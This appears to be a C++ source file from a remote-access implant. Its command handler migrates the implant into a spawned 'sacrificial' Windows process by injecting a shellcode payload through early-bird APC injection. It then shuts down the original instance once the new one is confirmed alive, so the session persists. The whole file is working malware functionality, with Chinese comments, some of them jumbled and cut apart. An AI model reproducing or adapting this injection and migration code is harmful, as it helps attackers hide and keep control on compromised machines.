#include "MigrateSpawnHandler.hpp"
#include "Core/Concurrency/ThreadGovernor.hpp"
#include "Core/Inject/InjectionRegistry.hpp"
#include "Core/Native/Win/ProcessUtil.hpp"
#include "Common/Logger/ErrLog.hpp"
#include "Common/Logger/Logger.hpp"
#include "Common/Protocol/Packet.hpp"
#include <thread>
#include <chrono>

namespace cleat {

    nlohmann::json MigrateSpawnHandler::Execute(const CommandRequest& req) {
#ifdef _WIN32
        const auto itTarget = req.params.find("target");
        if (itTarget == req.params.end() || !itTarget->is_string() || itTarget->get<std::string>().empty()) {
            return Packet::Error("MigrateSpawn requires 'target' (sacrificial image path)");
        }
        if (req.payload.empty()) {
            return Packet::Error("MigrateSpawn requires shc binary body");
        }

        // v2: 迁移降格为注入特例 —— 经注册表取 apc_injection 手法
        // (spawn 牺牲进程 + early-bird APC), 不再直连 native 层注入实现;
        injection::RegisterBuiltinInjectionMethods();
        auto* apc = injection::InjectionRegistry::Instance().Find("apc_injection");
        if (!apc) {
            return Packet::Error("apc_injection method missing");
        }
        injection::InjectionTarget target;
        target.kind = injection::TargetKind::Spawn;
        target.image = itTarget->get<std::string>();
        const injection::InjectionResult r =
            apc->Inject(req.payload, injection::PayloadKind::Blob, target);
        if (!r.ok) {
            char hex[16]{};
            sprintf_s(hex, sizeof(hex), "%lX", static_cast<unsigned long>(r.failed_at));
            return Packet::Error("inject failed: " + r.error + " (0x" + std::string(hex) + ")");
        }

        LOG_INFO("Migrate: injected pid=" << r.pid << ", 等待新实例存活确认");

        // 无条件 sleep 3s 后 RequestExit, 新实例若因宿主被杀/TLS/加载失败而未起来,
        // 闸门: 先给响应帧回传 + 牺牲进程 APC 触发 + shc 自举留 3s, 再最多 10s
        // 轮询 PID 存活; 期间拿不到存活证据就不自退, 源实例继续服务(宁可双活,
        // 判活走 ApiResolver 的 OpenProcess; 打不开句柄按"不存活"处理。
        std::thread([pid = r.pid] {
            // 线程治理: Ephemeral 只登记不服从 —— 等待有界(13s), 允许自然结束;
            // 暂停留痕时按未结束 Ephemeral 计数报告。
            const auto gov = ThreadGovernor::Attach("migrate-spawn-wait", JobKind::Ephemeral);
            (void)gov;
            std::this_thread::sleep_for(std::chrono::seconds(3));
            const auto deadline = std::chrono::steady_clock::now()
                + std::chrono::seconds(10);
            while (std::chrono::steady_clock::now() < deadline) {
                if (native::IsProcessAlive(pid)) {
                    LOG_INFO("Migrate: 新实例 pid=" << pid << " 存活确认, 本实例自退");
                    // 暂停粗睡中的服务/worker 收不到 -> 收尾 join 挂死)。
                    ThreadGovernor::RequestExit();
                    return;
                }
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
            }
            CLEAT_LOGE(ErrDom::Cmd, ErrCode::ResourceExhausted, "Migrate: 新实例 pid=" << pid
                << " 在 13s 内未确认存活, 本实例放弃自退(保会话)");
        }).detach();

        return Packet::Ok({ {"pid", r.pid},
                            {"note", "injected; source exits only after liveness check"} });
#else
        (void)req.params;
        (void)req.payload;
        return Packet::Error("MigrateSpawn is Windows-only");
#endif
    }

} // namespace cleat
